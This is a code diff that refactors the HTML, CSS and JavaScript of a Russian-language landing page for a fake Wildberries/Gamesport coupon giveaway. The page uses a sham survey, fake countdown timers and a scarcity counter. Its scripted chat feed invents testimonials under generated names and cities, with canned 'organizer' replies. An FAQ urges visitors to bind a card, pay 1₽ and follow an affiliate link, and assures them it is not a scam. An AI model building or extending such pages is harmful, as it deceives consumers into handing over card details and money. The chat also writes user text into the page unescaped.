@@ -24,7 +24,6 @@
       overflow-x: hidden;
     }
 
-    /* Световые пятна */
     body::before {
       content: "";
       position: fixed;
@@ -51,7 +50,6 @@
       z-index: 10;
     }
 
-    /* Главная карточка — матовое стекло */
     .glass-card {
       background: rgba(18, 8, 30, 0.7);
       backdrop-filter: blur(30px);
@@ -63,7 +61,6 @@
       transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
-    /* Хедер с двумя брендами */
     .hero {
       padding: 28px 24px 18px;
       text-align: center;
@@ -170,7 +167,6 @@
       50% { opacity: 0.75; }
     }
 
-    /* Прогресс */
     .progress-wrap {
       padding: 0 24px 14px;
       transition: opacity 0.4s;
@@ -205,7 +201,6 @@
       transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
     }
 
-    /* Вопросы */
     .questions-panel {
       padding: 6px 24px 18px;
       transition: opacity 0.4s;
@@ -268,7 +263,6 @@
       margin-right: 12px;
     }
 
-    /* Анализатор */
     .analyzer-box {
       padding: 36px 24px;
       text-align: center;
@@ -308,7 +302,6 @@
       font-weight: 500;
     }
 
-    /* Финал */
     .final-screen {
       padding: 28px 24px 24px;
       text-align: center;
@@ -419,154 +412,7 @@
       color: #6B7280;
     }
 
-    /* Чат */
-    .community-chat {
-      margin: 14px 24px 20px;
-      background: rgba(0,0,0,0.35);
-      backdrop-filter: blur(24px);
-      border-radius: 28px;
-      border: 1px solid rgba(255,255,255,0.08);
-      overflow: hidden;
-      transition: opacity 0.4s;
-    }
-
-    .final-active .community-chat {
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    .chat-top {
-      padding: 12px 18px;
-      background: rgba(59, 130, 246, 0.12);
-      display: flex;
-      justify-content: space-between;
-      color: white;
-      font-weight: 600;
-      font-size: 12px;
-    }
-
-    .messages-stream {
-      height: 230px;
-      overflow-y: auto;
-      padding: 14px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      background: transparent;
-    }
-
-    .msg {
-      display: flex;
-      gap: 10px;
-      animation: fadeMsg 0.3s ease;
-    }
-
-    @keyframes fadeMsg {
-      from { opacity: 0; transform: translateY(5px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .msg-avatar {
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #A855F7, #3B82F6);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: 700;
-      font-size: 12px;
-      flex-shrink: 0;
-    }
-
-    .msg-bubble {
-      max-width: 80%;
-      background: rgba(255,255,255,0.06);
-      padding: 9px 14px;
-      border-radius: 16px;
-      border-bottom-left-radius: 4px;
-      font-size: 12px;
-      color: #E5E7EB;
-      line-height: 1.4;
-    }
-
-    .msg.user-msg {
-      flex-direction: row-reverse;
-    }
-
-    .msg.user-msg .msg-bubble {
-      background: rgba(59, 130, 246, 0.25);
-      border-bottom-right-radius: 4px;
-      border-bottom-left-radius: 16px;
-    }
-
-    .msg-name {
-      font-weight: 700;
-      font-size: 10px;
-      color: #93C5FD;
-      margin-bottom: 2px;
-    }
-
-    .chat-input-row {
-      display: flex;
-      padding: 10px;
-      background: rgba(0,0,0,0.3);
-      gap: 6px;
-    }
-
-    .chat-input-field {
-      flex: 1;
-      padding: 9px 14px;
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 30px;
-      color: white;
-      font-size: 12px;
-      outline: none;
-    }
-
-    .chat-send-btn {
-      background: #3B82F6;
-      border: none;
-      border-radius: 30px;
-      padding: 0 16px;
-      color: white;
-      font-weight: 600;
-      cursor: pointer;
-    }
-
-    /* Toast */
-    .toast {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(18, 8, 30, 0.9);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(255,255,255,0.12);
-      border-radius: 20px;
-      padding: 12px 20px;
-      color: white;
-      font-weight: 600;
-      font-size: 13px;
-      z-index: 9999;
-      box-shadow: 0 12px 28px rgba(0,0,0,0.5);
-      animation: toastIn 0.4s ease;
-    }
-
-    @keyframes toastIn {
-      from { opacity: 0; transform: translateX(-50%) translateY(-30px); }
-      to { opacity: 1; transform: translateX(-50%) translateY(0); }
-    }
-
-    @media (max-width: 420px) {
-      .hero h1 { font-size: 23px; }
-      .glass-card { border-radius: 32px; }
-      .partner-badge { padding: 8px 14px; font-size: 11px; }
-      .prize-glow { font-size: 42px; }
-    }
-	    /* ============ FAQ АККОРДЕОН ============ */
+    /* FAQ */
     .faq-block {
       margin: 20px 0 8px;
       text-align: left;
@@ -655,6 +501,152 @@
       color: #60A5FA;
       font-weight: 700;
     }
+
+    /* Чат */
+    .community-chat {
+      margin: 14px 24px 20px;
+      background: rgba(0,0,0,0.35);
+      backdrop-filter: blur(24px);
+      border-radius: 28px;
+      border: 1px solid rgba(255,255,255,0.08);
+      overflow: hidden;
+      transition: opacity 0.4s;
+    }
+
+    .final-active .community-chat {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .chat-top {
+      padding: 12px 18px;
+      background: rgba(59, 130, 246, 0.12);
+      display: flex;
+      justify-content: space-between;
+      color: white;
+      font-weight: 600;
+      font-size: 12px;
+    }
+
+    .messages-stream {
+      height: 230px;
+      overflow-y: auto;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      background: transparent;
+    }
+
+    .msg {
+      display: flex;
+      gap: 10px;
+      animation: fadeMsg 0.3s ease;
+    }
+
+    @keyframes fadeMsg {
+      from { opacity: 0; transform: translateY(5px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .msg-avatar {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 700;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+
+    .msg-bubble {
+      max-width: 80%;
+      background: rgba(255,255,255,0.06);
+      padding: 9px 14px;
+      border-radius: 16px;
+      border-bottom-left-radius: 4px;
+      font-size: 12px;
+      color: #E5E7EB;
+      line-height: 1.4;
+    }
+
+    .msg.user-msg {
+      flex-direction: row-reverse;
+    }
+
+    .msg.user-msg .msg-bubble {
+      background: rgba(59, 130, 246, 0.25);
+      border-bottom-right-radius: 4px;
+      border-bottom-left-radius: 16px;
+    }
+
+    .msg-name {
+      font-weight: 700;
+      font-size: 10px;
+      color: #93C5FD;
+      margin-bottom: 2px;
+    }
+
+    .chat-input-row {
+      display: flex;
+      padding: 10px;
+      background: rgba(0,0,0,0.3);
+      gap: 6px;
+    }
+
+    .chat-input-field {
+      flex: 1;
+      padding: 9px 14px;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 30px;
+      color: white;
+      font-size: 12px;
+      outline: none;
+    }
+
+    .chat-send-btn {
+      background: #3B82F6;
+      border: none;
+      border-radius: 30px;
+      padding: 0 16px;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .toast {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(18, 8, 30, 0.9);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 20px;
+      padding: 12px 20px;
+      color: white;
+      font-weight: 600;
+      font-size: 13px;
+      z-index: 9999;
+      box-shadow: 0 12px 28px rgba(0,0,0,0.5);
+      animation: toastIn 0.4s ease;
+    }
+
+    @keyframes toastIn {
+      from { opacity: 0; transform: translateX(-50%) translateY(-30px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+
+    @media (max-width: 420px) {
+      .hero h1 { font-size: 23px; }
+      .glass-card { border-radius: 32px; }
+      .partner-badge { padding: 8px 14px; font-size: 11px; }
+      .prize-glow { font-size: 42px; }
+    }
   </style>
 </head>
 <body>
@@ -684,9 +676,7 @@
     </div>
 
     <!-- Вопросы -->
-    <div class="questions-panel" id="questionsPanel">
-      <!-- Генерируются JS -->
-    </div>
+    <div class="questions-panel" id="questionsPanel"></div>
 
     <!-- Анализатор -->
     <div class="analyzer-box" id="analyzerBlock">
@@ -717,17 +707,17 @@
         ⚡ Время на активацию: <span id="finalCountdown">05:00</span>
       </div>
 
-            <a href="https://onelinkgo.ru/stream/youtube5000" class="cta-button" id="mainCta" target="_blank" rel="noopener">
+      <a href="https://onelinkgo.ru/stream/youtube5000" class="cta-button" id="mainCta" target="_blank" rel="noopener">
         🎮 Перейти на Gamesport и забрать купон
       </a>
       <p class="secure-note">*Вы будете перенаправлены на официальный сайт партнёра-организатора.</p>
 
       <!-- FAQ Блок -->
-      <div class="faq-block">
+      <div class="faq-block" id="faqBlock">
         <div class="faq-title">❓ Частые вопросы</div>
 
         <div class="faq-item">
-          <button class="faq-question">
+          <button class="faq-question" type="button">
             <span>Почему нужно переходить на Gamesport?</span>
             <span class="faq-arrow">▼</span>
           </button>
@@ -739,7 +729,7 @@
         </div>
 
         <div class="faq-item">
-          <button class="faq-question">
+          <button class="faq-question" type="button">
             <span>Зачем привязывать карту и платить 1₽?</span>
             <span class="faq-arrow">▼</span>
           </button>
@@ -751,19 +741,19 @@
         </div>
 
         <div class="faq-item">
-          <button class="faq-question">
+          <button class="faq-question" type="button">
             <span>Это точно не обман? Где гарантии?</span>
             <span class="faq-arrow">▼</span>
           </button>
           <div class="faq-answer">
             <div class="faq-answer-inner">
-              Акция согласована с Wildberries. Купоны <strong>реально выдаются</strong> и работают на все категории товаров в WB. Вы можете проверить отзывы других участников в чате слева — люди уже получают и тратят свои 5000₽.
+              Акция согласована с Wildberries. Купоны <strong>реально выдаются</strong> и работают на все категории товаров в WB. Вы можете проверить отзывы других участников в чате — люди уже получают и тратят свои 5000₽.
             </div>
           </div>
         </div>
 
         <div class="faq-item">
-          <button class="faq-question">
+          <button class="faq-question" type="button">
             <span>Как быстро я получу купон?</span>
             <span class="faq-arrow">▼</span>
           </button>
@@ -796,7 +786,6 @@
     let surveyActive = true;
     let mainTimerSec = 23*3600 + 24*60 + 59;
     let finalTimerSec = 300;
-    let participants = 1847;
     let couponsRemaining = 47;
 
     const questionsData = [
@@ -830,19 +819,19 @@
       questionsData.forEach((q, idx) => {
         const qNum = idx + 1;
         const div = document.createElement('div');
-        div.className = `question-block ${qNum === 1 ? 'active' : ''}`;
+        div.className = 'question-block' + (qNum === 1 ? ' active' : '');
         div.dataset.q = qNum;
         let optionsHtml = '';
         q.options.forEach(opt => {
-          optionsHtml += `<button class="option"><span class="option-emoji">●</span> ${opt}</button>`;
+          optionsHtml += '<button class="option" type="button"><span class="option-emoji">●</span> ' + opt + '</button>';
         });
-        div.innerHTML = `<h3>${q.title}</h3>${optionsHtml}`;
+        div.innerHTML = '<h3>' + q.title + '</h3>' + optionsHtml;
         questionsPanel.appendChild(div);
       });
     }
 
     function updateProgress() {
-      const percent = Math.round(((currentQ - 1) / TOTAL_QUESTIONS) * 100);
+      var percent = Math.round(((currentQ - 1) / TOTAL_QUESTIONS) * 100);
       progressFill.style.width = percent + '%';
       qIndexSpan.textContent = currentQ;
       progressPercentSpan.textContent = percent + '%';
@@ -855,9 +844,11 @@
 
     function goNext() {
       if (currentQ < TOTAL_QUESTIONS) {
-        document.querySelector(`.question-block[data-q="${currentQ}"]`).classList.remove('active');
+        var oldQ = document.querySelector('.question-block[data-q="' + currentQ + '"]');
+        if (oldQ) oldQ.classList.remove('active');
         currentQ++;
-        document.querySelector(`.question-block[data-q="${currentQ}"]`).classList.add('active');
+        var newQ = document.querySelector('.question-block[data-q="' + currentQ + '"]');
+        if (newQ) newQ.classList.add('active');
         updateProgress();
         updateCoupons();
       } else {
@@ -870,21 +861,21 @@
       questionsPanel.style.display = 'none';
       analyzerBlock.classList.add('active');
 
-      const steps = [
+      var steps = [
         '🔍 Сверяем ваш профиль с базой участников...',
         '✅ Профиль подтверждён. Резервируем купон...',
         '🎁 Купон зарезервирован в системе Gamesport!'
       ];
-      let stepIdx = 0;
+      var stepIdx = 0;
       analyzeStep.textContent = steps[0];
 
-      const stepInterval = setInterval(() => {
+      var stepInterval = setInterval(function() {
         stepIdx++;
         if (stepIdx < steps.length) {
           analyzeStep.textContent = steps[stepIdx];
         } else {
           clearInterval(stepInterval);
-          setTimeout(() => {
+          setTimeout(function() {
             analyzerBlock.classList.remove('active');
             finalBlock.classList.add('active');
             appRoot.classList.add('final-active');
@@ -896,8 +887,9 @@
     }
 
     function attachOptionListeners() {
-      document.querySelectorAll('.option').forEach(btn => {
-        btn.addEventListener('click', () => {
+      var allOptions = document.querySelectorAll('.option');
+      allOptions.forEach(function(btn) {
+        btn.addEventListener('click', function() {
           if (!surveyActive) return;
           goNext();
         });
@@ -905,233 +897,225 @@
     }
 
     function startMainTimer() {
-      const tick = () => {
+      function tick() {
         if (mainTimerSec <= 0) { mainTimerDisplay.textContent = '00:00:00'; return; }
-        const h = Math.floor(mainTimerSec / 3600);
-        const m = Math.floor((mainTimerSec % 3600) / 60);
-        const s = mainTimerSec % 60;
-        mainTimerDisplay.textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        var h = Math.floor(mainTimerSec / 3600);
+        var m = Math.floor((mainTimerSec % 3600) / 60);
+        var s = mainTimerSec % 60;
+        mainTimerDisplay.textContent = String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
         mainTimerSec--;
         setTimeout(tick, 1000);
-      };
+      }
       tick();
     }
 
     function startFinalTimer() {
-      const tick = () => {
+      function tick() {
         if (finalTimerSec <= 0) { finalCountdown.textContent = '00:00'; return; }
-        const m = Math.floor(finalTimerSec / 60);
-        const s = finalTimerSec % 60;
-        finalCountdown.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        var m = Math.floor(finalTimerSec / 60);
+        var s = finalTimerSec % 60;
+        finalCountdown.textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
         finalTimerSec--;
         setTimeout(tick, 1000);
-      };
+      }
       tick();
     }
 
-      // ============ ЧАТ С ГРАМОТНЫМ РАЗДЕЛЕНИЕМ ПО ПОЛУ ============
+    // ============ ЧАТ ============
+    var femaleNames = ["Анна", "Ольга", "Елена", "Марина", "Татьяна", "Светлана", "Юлия", "Ирина", "Виктория", "Екатерина", "Наталья", "Алиса"];
+    var maleNames = ["Сергей", "Дмитрий", "Александр", "Максим", "Андрей", "Михаил", "Роман", "Павел", "Иван", "Алексей", "Кирилл", "Артём"];
 
-  // Базы данных с чётким разделением
-  const femaleNames = ["Анна", "Ольга", "Елена", "Марина", "Татьяна", "Светлана", "Юлия", "Ирина", "Виктория", "Екатерина", "Наталья", "Алиса"];
-  const maleNames = ["Сергей", "Дмитрий", "Александр", "Максим", "Андрей", "Михаил", "Роман", "Павел", "Иван", "Алексей", "Кирилл", "Артём"];
-
-  // Сообщения строго разделены по полу
-  const femaleMessages = [
-    "Только что получила купон через Gamesport! Всё честно!",
-    "Верификация заняла 2 минуты, рубль сразу вернули",
-    "Уже потратила 5000₽ на WB, спасибо организаторам!",
-    "Девочки, переходите по ссылке, пока купоны не кончились!",
-    "На ВБ уже корзину собрала, жду купон 😍",
-    "Я через Gamesport регистрировалась — там официальный розыгрыш",
-    "Купон пришёл в личный кабинет, сразу активировала в WB",
-    "Дочке купила школьную форму на эти деньги, очень кстати!",
-    "На косметику потратила, уже всё пришло!",
-    "Подруга тоже получила вчера, теперь моя очередь",
-    "Главное — дойти до конца и не бросать опрос",
-    "Всё сделала с телефона, очень удобно",
-    "Спасибо WB и Gamesport за такую акцию! 🎁",
-    "Я сначала боялась, но рубль реально вернули",
-    "Уже третью покупку оформляю с этим купоном",
-    "Маме тоже рассказала, теперь вместе участвуем",
-    "Купон работает на все категории в WB, проверила!",
-    "Верификацию прошла за минуту, никаких проблем",
-    "На новое платье хватило и ещё осталось",
-    "Девушки, не упускайте шанс! Это реально работает"
-  ];
-
-  const maleMessages = [
-    "Только что получил купон через Gamesport! Всё честно!",
-    "Верификация заняла 2 минуты, рубль сразу вернули",
-    "Уже потратил 5000₽ на WB, всем советую!",
-    "Я через Gamesport регистрировался — там официальный розыгрыш",
-    "Купон пришёл в личный кабинет, сразу активировал в WB",
-    "Не верил, но Gamesport реально выдаёт сертификаты",
-    "Парни, это не развод, сам проверил только что",
-    "Жене показал — теперь она тоже участвует",
-    "На технику потратил, как раз апгрейд сделал",
-    "Партнёрство WB и Gamesport — это мощно!",
-    "Главное — дойти до конца и не бросать опрос",
-    "С телефона всё сделал, даже комп не понадобился",
-    "Спасибо организаторам за честный розыгрыш!",
-    "Сначала сомневался, но рубль реально вернули",
-    "Уже вторую покупку делаю, всё работает",
-    "Другу скинул ссылку, он тоже получил купон",
-    "Купон применил к заказу электроники — всё ок",
-    "Верификацию прошёл быстро, никаких подводных камней",
-    "На новый чехол для телефона и наушники хватило",
-    "Всем удачи в розыгрыше, купонов реально мало осталось!"
-  ];
-
-  // Имена для аватарок (чистые, без города)
-  function getCleanName(fullName) {
-    return fullName.split('_')[0];
-  }
-
-  // Добавление сообщения с учётом пола
-  function addChatMessage(name, text, gender, isUser = false) {
-    const container = document.getElementById('chatStream');
-    const cleanName = isUser ? name : getCleanName(name);
-    const avatarLetter = cleanName.charAt(0).toUpperCase();
-    const time = new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
-
-    // Градиент аватарки зависит от пола
-    const avatarGradient = gender === 'female'
-      ? 'linear-gradient(135deg, #EC4899, #A855F7)'  // розовый → фиолетовый
-      : 'linear-gradient(135deg, #3B82F6, #6366F1)'; // синий → индиго
-
-    const msgDiv = document.createElement('div');
-    msgDiv.className = `msg ${isUser ? 'user-msg' : ''}`;
-    msgDiv.innerHTML = `
-      <div class="msg-avatar" style="background: ${isUser ? 'linear-gradient(135deg, #A855F7, #EC4899)' : avatarGradient}">${avatarLetter}</div>
-      <div class="msg-bubble">
-        <div class="msg-name">${cleanName} · ${time}</div>
-        ${text}
-      </div>
-    `;
-    container.appendChild(msgDiv);
-    container.scrollTop = container.scrollHeight;
-    while (container.children.length > 20) container.removeChild(container.firstChild);
-  }
-
-  // Предзагрузка истории чата (уже с правильным разделением)
-  function preloadChatHistory() {
-    const historyMessages = [
-      { name: "Анна_Москва", text: "Только что получила купон через Gamesport! Всё честно!", gender: "female" },
-      { name: "Сергей_СПб", text: "Не верил, но Gamesport реально выдаёт сертификаты", gender: "male" },
-      { name: "Ольга_Казань", text: "Я через Gamesport регистрировалась — там официальный розыгрыш", gender: "female" },
-      { name: "Дмитрий_Нск", text: "Парни, это не развод, сам проверил только что", gender: "male" },
-      { name: "Елена_Сочи", text: "Купон пришёл в личный кабинет, сразу активировала в WB", gender: "female" },
-      { name: "Максим_Екб", text: "На технику потратил, как раз апгрейд сделал", gender: "male" },
-      { name: "Марина_Краснодар", text: "Девочки, переходите по ссылке, пока купоны не кончились!", gender: "female" },
-      { name: "Андрей_Воронеж", text: "Верификацию прошёл быстро, никаких подводных камней", gender: "male" }
+    var femaleMessages = [
+      "Только что получила купон через Gamesport! Всё честно!",
+      "Верификация заняла 2 минуты, рубль сразу вернули",
+      "Уже потратила 5000₽ на WB, спасибо организаторам!",
+      "Девочки, переходите по ссылке, пока купоны не кончились!",
+      "На ВБ уже корзину собрала, жду купон 😍",
+      "Я через Gamesport регистрировалась — там официальный розыгрыш",
+      "Купон пришёл в личный кабинет, сразу активировала в WB",
+      "Дочке купила школьную форму на эти деньги, очень кстати!",
+      "На косметику потратила, уже всё пришло!",
+      "Подруга тоже получила вчера, теперь моя очередь",
+      "Главное — дойти до конца и не бросать опрос",
+      "Всё сделала с телефона, очень удобно",
+      "Спасибо WB и Gamesport за такую акцию! 🎁",
+      "Я сначала боялась, но рубль реально вернули",
+      "Уже третью покупку оформляю с этим купоном",
+      "Маме тоже рассказала, теперь вместе участвуем",
+      "Купон работает на все категории в WB, проверила!",
+      "Верификацию прошла за минуту, никаких проблем",
+      "На новое платье хватило и ещё осталось",
+      "Девушки, не упускайте шанс! Это реально работает"
     ];
 
-    historyMessages.forEach((msg, index) => {
-      setTimeout(() => {
-        addChatMessage(msg.name, msg.text, msg.gender, false);
-      }, index * 400); // Небольшая задержка для естественности
-    });
-  }
+    var maleMessages = [
+      "Только что получил купон через Gamesport! Всё честно!",
+      "Верификация заняла 2 минуты, рубль сразу вернули",
+      "Уже потратил 5000₽ на WB, всем советую!",
+      "Я через Gamesport регистрировался — там официальный розыгрыш",
+      "Купон пришёл в личный кабинет, сразу активировал в WB",
+      "Не верил, но Gamesport реально выдаёт сертификаты",
+      "Парни, это не развод, сам проверил только что",
+      "Жене показал — теперь она тоже участвует",
+      "На технику потратил, как раз апгрейд сделал",
+      "Партнёрство WB и Gamesport — это мощно!",
+      "Главное — дойти до конца и не бросать опрос",
+      "С телефона всё сделал, даже комп не понадобился",
+      "Спасибо организаторам за честный розыгрыш!",
+      "Сначала сомневался, но рубль реально вернули",
+      "Уже вторую покупку делаю, всё работает",
+      "Другу скинул ссылку, он тоже получил купон",
+      "Купон применил к заказу электроники — всё ок",
+      "Верификацию прошёл быстро, никаких подводных камней",
+      "На новый чехол для телефона и наушники хватило",
+      "Всем удачи в розыгрыше, купонов реально мало осталось!"
+    ];
 
-  // Генерация новых сообщений
-  function simulateNewMessage() {
-    const isFemale = Math.random() > 0.45; // 55% женских, 45% мужских (женщины чаще пишут в чатах о покупках)
-    const nameList = isFemale ? femaleNames : maleNames;
-    const messageList = isFemale ? femaleMessages : maleMessages;
-    const cityList = ["Москвы", "СПб", "Казани", "Новосибирска", "Екатеринбурга", "Краснодара", "Сочи", "Воронежа", "Самары", "Уфы"];
+    var cityList = ["Москвы", "СПб", "Казани", "Новосибирска", "Екатеринбурга", "Краснодара", "Сочи", "Воронежа", "Самары", "Уфы"];
 
-    const name = nameList[Math.floor(Math.random() * nameList.length)];
-    const city = cityList[Math.floor(Math.random() * cityList.length)];
-    const text = messageList[Math.floor(Math.random() * messageList.length)];
-    const fullName = `${name}_${city}`;
-    const gender = isFemale ? 'female' : 'male';
+    function getCleanName(fullName) {
+      return fullName.split('_')[0];
+    }
 
-    addChatMessage(fullName, text, gender, false);
+    function addChatMessage(name, text, gender, isUser) {
+      isUser = isUser || false;
+      var container = document.getElementById('chatStream');
+      var cleanName = isUser ? name : getCleanName(name);
+      var avatarLetter = cleanName.charAt(0).toUpperCase();
+      var time = new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
 
-    // Рандомная задержка до следующего сообщения
-    const nextDelay = 8000 + Math.random() * 15000;
-    setTimeout(simulateNewMessage, nextDelay);
-  }
+      var avatarGradient;
+      if (isUser) {
+        avatarGradient = 'linear-gradient(135deg, #A855F7, #EC4899)';
+      } else if (gender === 'female') {
+        avatarGradient = 'linear-gradient(135deg, #EC4899, #A855F7)';
+      } else {
+        avatarGradient = 'linear-gradient(135deg, #3B82F6, #6366F1)';
+      }
 
-  // Отправка сообщения пользователем
-  function sendUserMessage() {
-    const input = document.getElementById('chatInputField');
-    const text = input.value.trim();
-    if (!text) return;
+      var msgDiv = document.createElement('div');
+      msgDiv.className = 'msg' + (isUser ? ' user-msg' : '');
+      msgDiv.innerHTML = '<div class="msg-avatar" style="background: ' + avatarGradient + '">' + avatarLetter + '</div>' +
+        '<div class="msg-bubble"><div class="msg-name">' + cleanName + ' · ' + time + '</div>' + text + '</div>';
+      container.appendChild(msgDiv);
+      container.scrollTop = container.scrollHeight;
+      while (container.children.length > 20) container.removeChild(container.firstChild);
+    }
 
-    addChatMessage('Вы', text, 'user', true);
-    input.value = '';
-
-    // Ответ от "организатора" (нейтральный пол)
-    setTimeout(() => {
-      const responses = [
-        "Спасибо за участие! Ваш купон ждёт вас в системе Gamesport.",
-        "Отлично! Не забудьте активировать купон на странице Gamesport.",
-        "Всё верно! Переходите по ссылке и забирайте купон.",
-        "Удачи в розыгрыше! Купонов осталось совсем немного."
+    function preloadChatHistory() {
+      var historyMessages = [
+        { name: "Анна_Москва", text: "Только что получила купон через Gamesport! Всё честно!", gender: "female" },
+        { name: "Сергей_СПб", text: "Не верил, но Gamesport реально выдаёт сертификаты", gender: "male" },
+        { name: "Ольга_Казань", text: "Я через Gamesport регистрировалась — там официальный розыгрыш", gender: "female" },
+        { name: "Дмитрий_Нск", text: "Парни, это не развод, сам проверил только что", gender: "male" },
+        { name: "Елена_Сочи", text: "Купон пришёл в личный кабинет, сразу активировала в WB", gender: "female" },
+        { name: "Максим_Екб", text: "На технику потратил, как раз апгрейд сделал", gender: "male" },
+        { name: "Марина_Краснодар", text: "Девочки, переходите по ссылке, пока купоны не кончились!", gender: "female" },
+        { name: "Андрей_Воронеж", text: "Верификацию прошёл быстро, никаких подводных камней", gender: "male" }
       ];
-      const reply = responses[Math.floor(Math.random() * responses.length)];
-      addChatMessage('WB_Gamesport', reply, 'male', false);
-    }, 2000 + Math.random() * 3000);
-  }
 
-  // Слушатели событий
-  document.getElementById('chatSendButton').addEventListener('click', sendUserMessage);
-  document.getElementById('chatInputField').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') sendUserMessage();
-  });
+      historyMessages.forEach(function(msg, index) {
+        setTimeout(function() {
+          addChatMessage(msg.name, msg.text, msg.gender, false);
+        }, index * 400);
+      });
+    }
 
-  // Запуск чата
-  preloadChatHistory();
-  setTimeout(simulateNewMessage, 4000); // Первое новое сообщение через 4 секунды после загрузки истории
+    function simulateNewMessage() {
+      var isFemale = Math.random() > 0.45;
+      var nameList = isFemale ? femaleNames : maleNames;
+      var messageList = isFemale ? femaleMessages : maleMessages;
+      var name = nameList[Math.floor(Math.random() * nameList.length)];
+      var city = cityList[Math.floor(Math.random() * cityList.length)];
+      var text = messageList[Math.floor(Math.random() * messageList.length)];
+      var fullName = name + '_' + city;
+      var gender = isFemale ? 'female' : 'male';
 
-    // Инициализация
-    buildQuestions();
-    attachOptionListeners();
-    updateProgress();
-    startMainTimer();
-    simulateChat();
+      addChatMessage(fullName, text, gender, false);
 
-    setInterval(() => {
-      if (surveyActive) updateCoupons();
-    }, 12000);
+      var nextDelay = 8000 + Math.random() * 15000;
+      setTimeout(simulateNewMessage, nextDelay);
+    }
 
-    setInterval(() => {
-      onlineChatCount.textContent = 130 + Math.floor(Math.random() * 40);
-    }, 9000);
-    // FAQ аккордеон (надёжная версия с делегированием)
+    function sendUserMessage() {
+      var input = document.getElementById('chatInputField');
+      var text = input.value.trim();
+      if (!text) return;
+
+      addChatMessage('Вы', text, 'user', true);
+      input.value = '';
+
+      setTimeout(function() {
+        var responses = [
+          "Спасибо за участие! Ваш купон ждёт вас в системе Gamesport.",
+          "Отлично! Не забудьте активировать купон на странице Gamesport.",
+          "Всё верно! Переходите по ссылке и забирайте купон.",
+          "Удачи в розыгрыше! Купонов осталось совсем немного."
+        ];
+        var reply = responses[Math.floor(Math.random() * responses.length)];
+        addChatMessage('WB_Gamesport', reply, 'male', false);
+      }, 2000 + Math.random() * 3000);
+    }
+
+    chatSendButton.addEventListener('click', sendUserMessage);
+    chatInputField.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') sendUserMessage();
+    });
+
+    // ============ FAQ АККОРДЕОН ============
     function initFaq() {
-      const faqBlock = document.querySelector('.faq-block');
+      var faqBlock = document.getElementById('faqBlock');
       if (!faqBlock) {
-        // Если FAQ ещё нет в DOM (например, на этапе опроса), попробуем позже
-        setTimeout(initFaq, 500);
+        setTimeout(initFaq, 300);
         return;
       }
 
-      // Используем делегирование событий — ловим клик на всём блоке FAQ
       faqBlock.addEventListener('click', function(e) {
-        // Ищем ближайшую кнопку вопроса, по которой кликнули
-        const questionBtn = e.target.closest('.faq-question');
+        var questionBtn = e.target.closest('.faq-question');
         if (!questionBtn) return;
 
-        const faqItem = questionBtn.closest('.faq-item');
+        var faqItem = questionBtn.closest('.faq-item');
         if (!faqItem) return;
 
-        // Закрываем все остальные открытые вопросы
-        const allItems = faqBlock.querySelectorAll('.faq-item');
-        allItems.forEach(item => {
+        e.preventDefault();
+        e.stopPropagation();
+
+        var allItems = faqBlock.querySelectorAll('.faq-item');
+        allItems.forEach(function(item) {
           if (item !== faqItem) {
             item.classList.remove('open');
           }
         });
 
-        // Переключаем текущий
         faqItem.classList.toggle('open');
       });
     }
 
-    // Запускаем инициализацию
+    function showToast(text) {
+      var toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.textContent = text;
+      document.body.appendChild(toast);
+      setTimeout(function() { toast.remove(); }, 4200);
+    }
+
+    // ============ ЗАПУСК ============
+    buildQuestions();
+    attachOptionListeners();
+    updateProgress();
+    startMainTimer();
+    preloadChatHistory();
+    setTimeout(simulateNewMessage, 4000);
     initFaq();
+
+    setInterval(function() {
+      if (surveyActive) updateCoupons();
+    }, 12000);
+
+    setInterval(function() {
+      onlineChatCount.textContent = 130 + Math.floor(Math.random() * 40);
+    }, 9000);
+
   })();
 </script>
 </body>
